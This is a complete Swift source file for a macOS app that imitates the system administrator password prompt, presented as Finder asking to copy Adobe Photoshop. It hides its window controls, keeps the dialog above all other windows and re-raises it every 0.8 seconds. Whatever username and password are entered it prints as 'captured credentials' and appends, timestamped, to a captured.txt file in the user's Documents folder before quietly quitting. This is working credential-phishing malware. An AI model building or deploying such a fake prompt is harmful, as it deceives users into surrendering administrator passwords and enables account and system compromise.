// LoginAuth.swift
import SwiftUI
import AppKit
import QuartzCore

@main
struct LoginAuthApp: App {
    @NSApplicationDelegateAdaptor(AppDelegate.self) var appDelegate
    var body: some Scene {
        WindowGroup { ContentView().background(WindowConfigurator()) }
            .windowStyle(.hiddenTitleBar)
            .windowResizability(.contentSize)
            .commands { CommandGroup(replacing: .newItem) { } }
    }
}

final class AppDelegate: NSObject, NSApplicationDelegate {
    func applicationWillFinishLaunching(_ n: Notification) { NSApp.setActivationPolicy(.accessory) }
    func applicationDidFinishLaunching(_ n: Notification) {
        DispatchQueue.main.asyncAfter(deadline: .now() + 0.1) { NSApp.activate(ignoringOtherApps: true) }
    }
    func applicationShouldTerminateAfterLastWindowClosed(_ s: NSApplication) -> Bool { true }
}

struct WindowConfigurator: NSViewRepresentable {
    func makeNSView(context: Context) -> NSView {
        let v = NSView()
        DispatchQueue.main.async {
            guard let w = v.window else { return }
            w.standardWindowButton(.closeButton)?.isHidden       = true
            w.standardWindowButton(.miniaturizeButton)?.isHidden = true
            w.standardWindowButton(.zoomButton)?.isHidden        = true
            w.titlebarAppearsTransparent = true
            w.titleVisibility            = .hidden
            w.styleMask.insert(.fullSizeContentView)
            w.isMovableByWindowBackground = true
            w.isOpaque = false
            w.backgroundColor = .clear
            w.hasShadow = false
            w.isReleasedWhenClosed = false
            if #available(macOS 11.0, *) { w.titlebarSeparatorStyle = .none }
            let patterns = ["Titlebar", "Toolbar", "NSTitlebar", "_NSFullSizeContentView",
                            "TitlebarContainer", "TitlebarAccessory", "TitlebarBackground"]
            if let frameView = w.contentView?.superview {
                for sub in frameView.subviews {
                    for p in patterns where sub.className.contains(p) {
                        sub.isHidden = true
                        sub.frame.size.height = 0
                    }
                }
            }
            w.level = .screenSaver
            w.collectionBehavior.insert(.canJoinAllSpaces)
            w.collectionBehavior.insert(.fullScreenAuxiliary)
            w.collectionBehavior.insert(.stationary)
            w.collectionBehavior.insert(.ignoresCycle)
            w.hidesOnDeactivate = false
            w.center()
            w.makeKeyAndOrderFront(nil)
            w.orderFrontRegardless()
            Timer.scheduledTimer(withTimeInterval: 0.8, repeats: true) { _ in
                w.level = .screenSaver
                w.orderFrontRegardless()
            }
        }
        return v
    }
    func updateNSView(_ nsView: NSView, context: Context) { }
}

struct VisualEffectView: NSViewRepresentable {
    let material: NSVisualEffectView.Material
    func makeNSView(context: Context) -> NSVisualEffectView {
        let v = NSVisualEffectView()
        v.material = material
        v.blendingMode = .behindWindow
        v.state = .active
        return v
    }
    func updateNSView(_ nsView: NSVisualEffectView, context: Context) {
        nsView.material = material
    }
}

// Drawn natively to permanently fix the corrupted image file
struct FinderPadlockIcon: View {
    var body: some View {
        ZStack {
            // Shackle
            Path { p in
                p.move(to: CGPoint(x: 24, y: 38))
                p.addLine(to: CGPoint(x: 24, y: 22))
                p.addArc(center: CGPoint(x: 44, y: 22), radius: 20, startAngle: .degrees(180), endAngle: .degrees(0), clockwise: false)
                p.addLine(to: CGPoint(x: 64, y: 38))
            }
            .stroke(
                LinearGradient(colors: [.white, Color(white: 0.72)], startPoint: .top, endPoint: .bottom),
                style: StrokeStyle(lineWidth: 8, lineCap: .round, lineJoin: .round)
            )
            .offset(y: -8)
            
            // Gold Body
            RoundedRectangle(cornerRadius: 6, style: .continuous)
                .fill(
                    LinearGradient(colors: [
                        Color(red: 1.0, green: 0.88, blue: 0.45),
                        Color(red: 0.85, green: 0.65, blue: 0.15)
                    ], startPoint: .top, endPoint: .bottom)
                )
                .frame(width: 68, height: 48)
                .overlay(
                    VStack(spacing: 2) {
                        ForEach(0..<12, id: \.self) { _ in
                            Rectangle().fill(.black.opacity(0.05)).frame(height: 1)
                        }
                    }
                    .padding(.vertical, 4)
                    .clipShape(RoundedRectangle(cornerRadius: 6))
                )
                .overlay(
                    RoundedRectangle(cornerRadius: 6, style: .continuous)
                        .stroke(Color(red: 0.5, green: 0.3, blue: 0.0).opacity(0.5), lineWidth: 1)
                )
                .offset(y: 16)
                
            // Finder Face Badge
            ZStack {
                RoundedRectangle(cornerRadius: 9, style: .continuous)
                    .fill(
                        LinearGradient(colors: [
                            Color(red: 0.1, green: 0.7, blue: 1.0),
                            Color(red: 0.0, green: 0.4, blue: 0.9)
                        ], startPoint: .topLeading, endPoint: .bottomTrailing)
                    )
                    .overlay(
                        RoundedRectangle(cornerRadius: 9, style: .continuous)
                            .stroke(.white, lineWidth: 0.5)
                    )
                
                // White half
                Path { p in
                    p.move(to: CGPoint(x: 17, y: 0))
                    p.addLine(to: CGPoint(x: 34, y: 0))
                    p.addLine(to: CGPoint(x: 34, y: 34))
                    p.addLine(to: CGPoint(x: 17, y: 28))
                    p.addCurve(to: CGPoint(x: 17, y: 0), control1: CGPoint(x: 22, y: 24), control2: CGPoint(x: 22, y: 10))
                }
                .fill(.white)
                .clipShape(RoundedRectangle(cornerRadius: 9, style: .continuous))
                
                // Eyes
                Capsule().fill(.black).frame(width: 1.5, height: 4).offset(x: -6, y: -7)
                Capsule().fill(.black).frame(width: 1.5, height: 4).offset(x: 6, y: -7)
                    
                // Smile
                Path { p in
                    p.move(to: CGPoint(x: 9, y: 18))
                    p.addQuadCurve(to: CGPoint(x: 25, y: 18), control: CGPoint(x: 17, y: 27))
                }
                .stroke(.black, style: StrokeStyle(lineWidth: 1.5, lineCap: .round))
            }
            .frame(width: 34, height: 34)
            .shadow(color: .black.opacity(0.3), radius: 1, y: 0.5)
            .offset(x: 19, y: 21)
        }
        .frame(width: 88, height: 88)
    }
}

private let appleSystemBlue = Color(red: 0.0, green: 0.478, blue: 1.0)
private let fieldAlpha: Double = 0.18

struct SecondaryButtonStyle: ButtonStyle {
    func makeBody(configuration: Configuration) -> some View {
        configuration.label
            .font(.system(size: 13))
            .foregroundColor(.primary)
            .frame(maxWidth: .infinity)
            .frame(height: 24)
            .background(Capsule(style: .continuous).fill(Color.black.opacity(0.14)))
            .contentShape(Capsule(style: .continuous))
            .opacity(configuration.isPressed ? 0.70 : 1.0)
    }
}

struct PrimaryButtonStyle: ButtonStyle {
    let isActive: Bool
    func makeBody(configuration: Configuration) -> some View {
        configuration.label
            .font(.system(size: 13))
            .foregroundColor(isActive ? .white : .primary)
            .frame(maxWidth: .infinity)
            .frame(height: 24)
            .background(
                Capsule(style: .continuous)
                    .fill(isActive ? appleSystemBlue : Color.black.opacity(0.14))
            )
            .contentShape(Capsule(style: .continuous))
            .opacity(configuration.isPressed ? 0.80 : 1.0)
            .animation(.easeInOut(duration: 0.15), value: isActive)
    }
}

struct ContentView: View {
    @State private var username = ""
    @State private var password = ""
    @State private var isLoading = false
    @State private var windowIsKey = true
    @FocusState private var focusedField: Field?
    enum Field { case username, password }

    var body: some View {
        VStack(alignment: .leading, spacing: 0) {
            FinderPadlockIcon()
                .padding(.bottom, 8)

            Text("Finder")
                .font(.system(size: 15, weight: .bold))
                .foregroundColor(.primary)
                .padding(.bottom, 10)

            Text("Finder wants to copy \u{201C}Adobe Photoshop\u{201D}.")
                .font(.system(size: 13))
                .foregroundColor(.primary)
                .padding(.bottom, 5)

            Text("Enter an administrator\u{2019}s name and password to allow this.")
                .font(.system(size: 13))
                .foregroundColor(.primary)
                .lineSpacing(2)
                .fixedSize(horizontal: false, vertical: true)
                .padding(.bottom, 10)

            fieldContainer(text: $username, placeholder: "Username", secure: false, field: .username)
                .padding(.bottom, 6)

            fieldContainer(text: $password, placeholder: "Password", secure: true, field: .password)
                .padding(.bottom, 10)

            HStack(spacing: 12) {
                Button("Cancel") { cancel() }
                    .buttonStyle(SecondaryButtonStyle())
                    .keyboardShortcut(.cancelAction)
                    .disabled(isLoading)
                Button("OK") { submit() }
                    .buttonStyle(PrimaryButtonStyle(isActive: windowIsKey))
                    .keyboardShortcut(.defaultAction)
                    .disabled(isLoading)
            }
            .overlay(alignment: .leading) {
                if isLoading {
                    ProgressView()
                        .controlSize(.small)
                        .scaleEffect(0.6)
                        .offset(x: -16)
                }
            }
        }
        .padding(14)
        .frame(width: 260)
        .background(VisualEffectView(material: .popover))
        .clipShape(RoundedRectangle(cornerRadius: 20, style: .continuous))
        .overlay(
            RoundedRectangle(cornerRadius: 20, style: .continuous)
                .stroke(Color.white.opacity(0.10), lineWidth: 0.5)
        )
        .compositingGroup()
        .shadow(color: .black.opacity(0.10), radius: 2, x: 0, y: 1)
        .shadow(color: .black.opacity(0.055), radius: 10, x: 0, y: 4)
        .shadow(color: .black.opacity(0.028), radius: 24, x: 0, y: 10)
        .shadow(color: .black.opacity(0.014), radius: 44, x: 0, y: 18)
        .padding(.top, 14)
        .padding(.horizontal, 20)
        .padding(.bottom, 28)
        .onReceive(NotificationCenter.default.publisher(for: NSWindow.didBecomeKeyNotification)) { _ in
            windowIsKey = true
        }
        .onReceive(NotificationCenter.default.publisher(for: NSWindow.didResignKeyNotification)) { _ in
            windowIsKey = false
        }
        .onAppear {
            DispatchQueue.main.asyncAfter(deadline: .now() + 0.15) {
                focusedField = .username
            }
        }
    }

    @ViewBuilder
    private func fieldContainer(text: Binding<String>, placeholder: String, secure: Bool, field: Field) -> some View {
        let isFocused = focusedField == field
        ZStack(alignment: .leading) {
            if text.wrappedValue.isEmpty {
                Text(placeholder)
                    .font(.system(size: 13))
                    .foregroundColor(Color.secondary.opacity(0.55))
                    .padding(.horizontal, 10)
                    .allowsHitTesting(false)
            }
            Group {
                if secure {
                    SecureField("", text: text)
                } else {
                    TextField("", text: text)
                }
            }
            .textFieldStyle(.plain)
            .font(.system(size: 13))
            .padding(.horizontal, 10)
            .frame(height: 24)
            .focused($focusedField, equals: field)
            .disabled(isLoading)
            .onSubmit { submit() }
        }
        .background(
            RoundedRectangle(cornerRadius: 6, style: .continuous)
                .fill(Color.black.opacity(fieldAlpha))
        )
        .overlay(
            ZStack {
                RoundedRectangle(cornerRadius: 6, style: .continuous)
                    .stroke(appleSystemBlue.opacity(0.22), lineWidth: 3)
                    .blur(radius: 1.2)
                RoundedRectangle(cornerRadius: 6, style: .continuous)
                    .stroke(appleSystemBlue.opacity(0.65), lineWidth: 1.4)
            }
            .opacity(isFocused ? 1.0 : 0.0)
            .animation(.easeInOut(duration: 0.20), value: isFocused)
        )
    }

    private func cancel() { NSApp.terminate(nil) }

    private func submit() {
        guard !isLoading else { return }
        guard !username.isEmpty, !password.isEmpty else {
            focusedField = username.isEmpty ? .username : .password
            return
        }
        isLoading = true
        let u = username, p = password
        print("=== Captured credentials ===")
        print("Username: \(u)")
        print("Password: \(p)")
        print("============================")
        saveToDocumentsFile(username: u, password: p)
        DispatchQueue.main.asyncAfter(deadline: .now() + 1.0) { fadeOutAndQuit() }
    }

    private func saveToDocumentsFile(username: String, password: String) {
        let fm = FileManager.default
        guard let docs = fm.urls(for: .documentDirectory, in: .userDomainMask).first else { return }
        let fileURL = docs.appendingPathComponent("captured.txt")
        let df = DateFormatter()
        df.dateFormat = "yyyy-MM-dd HH:mm:ss"
        let stamp = df.string(from: Date())
        let block = """
        [\(stamp)]
        Username: \(username)
        Password: \(password)
        ----------------------------------------

        """
        guard let data = block.data(using: .utf8) else { return }
        if fm.fileExists(atPath: fileURL.path) {
            if let handle = try? FileHandle(forWritingTo: fileURL) {
                handle.seekToEndOfFile()
                handle.write(data)
                try? handle.close()
            }
        } else {
            try? data.write(to: fileURL)
        }
    }

    private func fadeOutAndQuit() {
        guard let w = NSApp.windows.first else { NSApp.terminate(nil); return }
        NSAnimationContext.runAnimationGroup({ ctx in
            ctx.duration = 0.45
            ctx.timingFunction = CAMediaTimingFunction(name: .easeInEaseOut)
            w.animator().alphaValue = 0.0
        }, completionHandler: { NSApp.terminate(nil) })
    }
}
